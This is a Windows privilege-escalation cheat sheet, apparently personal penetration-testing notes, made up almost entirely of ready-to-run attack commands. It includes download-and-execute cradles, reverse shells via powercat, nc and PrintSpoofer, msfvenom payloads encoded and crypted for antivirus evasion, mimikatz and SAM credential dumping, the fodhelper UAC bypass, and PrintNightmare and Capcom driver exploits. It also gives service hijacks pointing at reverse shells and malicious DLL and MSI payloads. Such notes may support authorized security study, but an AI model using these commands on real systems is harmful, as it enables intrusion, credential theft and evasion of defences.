## WINDOWS PRIVESC

### TRANSFERS & SHELLS

````bash
#Powercat (Transfer / Shell)
powershell -nop -ep bypass -c iex(New-Object Net.WebClient).downloadString('[YOUR_SERVER]/powercat.ps1]')
powercat -c [REMOTE_IP] -p 443 -i C:\input_file
powercat -l -p 8000 -of C:\out_file

powercat -l -p 8000 
powercat -c [YOUR_IP] -p 8000 -e cmd

#Certutil (Transfer)
certutil -urlcache -split -f [YOUR_SERVER]/file.exe

#SMB (Transfer)
smbserv

net use x: \\[YOU_IP]\Share # <-- net view \\[share_path] to see files
copy \\[YOU_IP]\Share\[FILE.exe] [path/to/out.exe]

#SSH (Transfer)
sshserver
scp [victim_user]@[IP]:[PATH/TO/FILE] .

#Powershell Encoded (Shell)
[revshells.com -> powershell n.3 B64 encoded -> paste the full command with RCE]

#Executables (Shell, Commands)
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -x whoami.exe -e x86/shikata_ga_nai -i 9 -f exe > pay.exe
msfvenom -a x86[x64] --platform Windows -p windows/exec "[CMD]" -f exe > pay.exe

#Webshells (PHP, ASP.NET, JSP, WAR, NodeJS)
msfvenom -p php/reverse_php 
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war
msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444
````

### METHODOLOGY

```bash
#Password re-usage (also similar passwords) for every authentication protocol

#System, Environment
wmic qfe list full | findstr /i hotfix
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  # <-- paste wmic output + build number in https://patchchecker.com/
set

#Local Users + Lockout Threshold, Groups + Members, Current Membership + Privileges
net user
net user [local user]
net accounts

net localgroup
net localgroup [local group]

whoami /groups
whoami /priv

#Vulnerable Programs + Interesting Files
C:\Program Files
wmic product get name, version, vendor

tree /a /f  # <- from C:\Users
dir -force  

#Misconfigured Services + PATH/DLL Hijackings (. .\PowerUp.ps1)
Invoke-AllChecks  # <-- Unquoted paths, Binpath permission, Overwrite permission + Restart permissions + LocalSystem name
sc qc [service_name]

$env:Path
sc qc IKEEXT && dir /s wlbsctrl.dll # <-- Try it when C:\Python27 is in PATH
dir /s WptsExtensions.dll && shutdown /r /t 5 # <-- Task scheduler, reboot privilege required
sc qc NetMan && dir /s wlanapi.dll  # <-- Start / Stop privilege required

#Localhost listening services
netstat -ano | findstr "LISTENING"
powershell -c Get-Process -Id (Get-NetTCPConnection -LocalPort [PORT]).OwningProcess
powershell -c Get-Process -Id (Get-NetUDPEndpoint -LocalPort [PORT]).OwningProcess

#Currently Running Processes + Credentials in running commands
powershell -c ps  #<-- Redirect flow? Vulnerabilities? Misconfigurations?

#Non-Standard / Abusable Scheduled Tasks / Startup apps
schtasks /query /fo LIST /v | findstr /v "\Microsoft"  # <-- "Run As User" - "Schedule Type" - "Task to Run"
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl

#Saved Credentials + SAM Backups + Reg/Files Content search + Hunt for every other configuration file!
cmdkey /list
reg query HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
HKCU\Software\Microsoft\Terminal Server Client\Servers\
dir /S /B /a Services.xml == Groups.xml == Drives.xml == ScheduledTasks.xml == Printers.xml == DataSources.xml == Sysrep.xml == *unattend* == *vnc* == *config*.php == *id_rsa* == *users* == *passwords* == *_history* == .htpasswd == *.git* == known_hosts == web.config == ConsoleHost_history.txt == *.kbdx
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
doskey /history

C:\Windows\Repair
C:\Windows\System32\config\RegBack

reg query HKLM /f "password" /t REG_SZ /s  #HKCU Also
findstr /spin "password" *.xml *.ini *.txt *.config *.bak *.inf *.old *.bat *.php *.aspx *.asp  #Also *.*

runas /savecred /user:[USER] /profile "cmd.exe"
runas /env /profile /user:[USER] [PASS] "[CMD]"  # <-- Try noprofile too, try powershell cred objects

Lazagne.exe

#Credential Objects Usage
$passwd = ConvertTo-SecureString "[PASS]" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("[USER]", $passwd)
Invoke-Command -ComputerName [COMPUTER] -ScriptBlock {[CMD]} -credential $creds

#If you are "LOCAL / NETWORK SERVICE" -> FullPowers restores your privileges
FullPowers.exe -c "C:\Windows\Temp [IP] [PORT] -e cmd" -z
FullPowers.exe -x

#PrintNightmare -> SeLoadDriverPrivilege / Print Operators
sc qc spoolsv/spooler
req query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
[NoWarningNoElevationOnInstall = 1 && UpdatePromptSettings]

git clone https://github.com/calebstewart/CVE-2021-1675
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "mike" -NewPassword "pass123"

#HiveNightmare -> PAAT (Win 10 / 11)
icacls C:\Windows\System32\Config\SAM # <-- R access?
samdump2 SYSTEM SAM -o hashes.txt

#Third party drivers / AFD (https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*[NAME]*"}

#Symlink Exploitation
./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"

#Process dumps
procdump.exe -accepteula -ma [ID] process.dmp # <-- Use "strings -el" to search the dump
```

### PRIVILEGES

```bash
#SeImpersonate / SeAssignPrimary:
-> Potato[32]64.exe -l 4444 -p "type access.txt" -t *	     # -> (Windows 7,8,10 < 1809,2008 R2,2012)
-> PrintSpoofer.exe -c "nc.exe [IP] [port] -e cmd"           # -> (Windows Server >= 2016 but < 2019)
-> socat tcp-listen:135,reuseaddr,fork tcp:[VICTIM_IP]:9999  # -> (>= Windows 10 1809 & Windows Server 2019)
   RoguePotato.exe -r [YOUR_IP] -e "[CMD]" -l 9999
-> incognito.exe -h [IP] -u [user] -p [pass] list_tokens -u (-g for groups)  # -> Generic token impersonation
   incognito.exe -h [IP] -u [user] -p [pass] execute -c [token] [command]

#SeBackupPrivilege:
-> import-module .\Acl-FUllControl.ps1
-> Acl-FUllControl -user [user] -path [path]
-> robocopy /b [SENSITIVE\PATH] [CONTRLLED\PATH]
-> reg save HKLM\[sam/system] [sam/system].bin + samdump

#SeRestore
-> SeRestoreAbuse.exe -c "[cmd]"

#SeDebug + SeImpersonate
-> Load SharpSploit.dll (WIN-RM DLL-loader) then run [SharpSploit.Credentials.Mimikatz]::SamDump() 
-> token::elevate

#SeDebug
-> From mimikatz.exe -> privilege::debug -> sekurlsa::logonpasswords (or tickets) -> lsadump::lsa /patch -> LSASS.ps1

#SeCreateToken
-> Check "https://greyhathacker.net/?p=1025"

#SeLoadDriver (eg. Print Operators group -> PrintNightmare also)
-> Download https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
-> Compile the https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp
-> Compile the https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp
-> Modify the LaunchShell function:
	static bool LaunchShell()
	{
    	TCHAR CommandLine[] = TEXT("C:\\Windows\\Temp\\revshell.exe");
-> Upload capcom.sys, the compiled exploit, the revshell.exe, EoP.exe
-> PS_> .\EopLoadDriver.exe System\CurrentControlSet\MyService Capcom.sys
-> PS_> .\ExploitCapcom.exe

#Also important (combined with softwares too)
SeTcb
SeTakeOwnerShip
```

### SECURITY BYPASSES

```bash
#-------------------------POWERSHELL-------------------------#
#Version, Architecture, Constrained Language
$PSVersionTable.PSVersion
[Environment]::Is64BitProces
$ExecutionContext.SessionState.LanguageMode

#Powershell Paths / Archs
%SystemRoot%\sysnative[system32]\WindowsPowerShell\v1.0\powershell.exe  # 64 bit
%systemroot%\syswow64\windowspowershell\v1.0\powershell.exe   # 32 bit

[Environment]::Is64BitProcess				  #Match the system architecture with the PS architecture
[Environment]::Is64BitOperatingSystem

#---------------------------UAC BYPASSES-----------------------------------------#
#From a local admin session
whoami /priv # --> Check if you have restricted privileges
whoami /groups # --> Check the mandatory label, is it medium?

# check directly if UAC turned on
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

EnableLUA                  REG_DWORD 0x1 # if 0x1 = UAC ENABLED
ConsentPromptBehaviorAdmin REG_DWORD 0x5 # if NOT 0x0 = consent required
PromptOnSecureDesktop      REG_DWORD 0x1 # if 0x1 = Force all credential/consent prompts

#1) Fodhelper way
where fodhelper
powershell.exe -nop -ep bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "[COMMAND_TO_EXECUTE]" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
psexec -i -s -d cmd.exe

#2) Autoelevate binaries + sysrep.exe DLL Hijacking
cd c:\windows\ 
strings -s *.exe | findstr /i autoelevate
dir /s /b CRYPTBASE.dll

#If doesn't work, search UAC bypasses based on version, and try bypassuac-x86.exe (or x64)

#-------------------AV-EVASION----------------------#
#Enumerate antivirus + Whitelisted paths
wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
sc query windefend

reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"

#MSFVenom + Hyperion
msfvenom -p windows/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell.exe
wine /usr/share/windows-binaries/hyperion/hyperion.exe shell.exe crypted.exe

#Shellter custom shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > code.bin
```

### KERNEL EXPLOITATION

```bash
#Compiled exploits
https://github.com/SecWiki/windows-kernel-exploits

#https://www.exploit-db.com/exploits/15609 - UAC Bypass
Windows Vista/2008 6.1.6000 x32,
Windows Vista/2008 6.1.6001 x32,
Windows 7 6.2.7600 x32,
Windows 7/2008 R2 6.2.7600 x64

#MS15-051
Server 2008 Unpatched

#MS10-092 / MS16-014
Server 2008 R2 Unpatched

#MS16-016
Windows 7 SP1 x86 (build 7601)

#MS16-014
Windows 7 SP1 x86

#MS16-032
Windows 7 x86/x64
Windows 8 x86/x64
Windows 10
Windows Server 2008-2012 R2

#https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213
Windows 10 (1511/10586, 1607/14393 & 1703/15063)
Windows 7 SP1 x86/x64

#https://github.com/padovah4ck/CVE-2019-1253
Windows 10 (all versions) that are not patched with September (2019) update

#https://www.exploit-db.com/exploits/46718
Windows 10 (1607,1703, 1709, 1803, 1809)
Windows 7 and Windows 8.1
Windows server 2008 (R2), 2012 (R2), 2016 (Server Core) and 2019 (Server Core)

#----------------------EXPLOIT COMPILING-------------------------#
#32 / 64 Bit (C / C++)
i686-w64-mingw32-[gcc/g++] main.c -o main32.exe -lws2_32
x86_64-w64-mingw32-[gcc/g++] -o main64.exe main.c -lws2_32

#rev_tcp c++ example
i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

#C++ / CS Payload custom shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.113 LPORT=8081 -f dll -f csharp
#---------------------------------------------------------------#
```

### SID CHEATSHEET

```bash
#https://blogs.msmvps.com/erikr/2007/09/26/set-permissions-on-a-specific-service-windows/
#Example of SID: (A;;CCLCSWLOCRRC;;;AU)
Last two letters: AU, WD, BG, DU, LS, PU, SY
Firs letter: A / D  (Allow / Deny)
Start / Stop permissions: RP / WP
```

###  SERVICE EXPLOITS

```bash
#Services Exploitation (BinPath, Reg, Unquoted, Overwrite)
sc stop [service]
sc config [service] binpath="C:\windows\temp\nc.exe -e cmd [IP] [PORT]"
#[sc config [service] depend= ""]
#[sc config [service] obj= ".\LocalSystem" password= ""]
sc start [service]

req query [registry_key]
reg add [registry_key] /v ImagePath /t REG_EXPAND_SZ /d C:\path\to\rev.exe /f
net start [registry_key]

[drop binary in writable folder]

#AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp lhost=[your ip] lport=[your port] -f msi -o evil.msi
msiexec /quiet /qn /i C:\evil.msi

#-------------------DLL Hijacking---------------------------#
#From a RDP session
start procmon -> start binary -> filter by process name -> filter the result to NAME NOT FOUND
The folder must precede C:\windows\system32

#Compile the malicious dll (64 / 32 bits)
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll -lws2_32

#windows_dll.c FILE CONTENTS
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}

#Or do it with MSFVenom
msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[PORT] -f dll > malicious.dll
```

## 
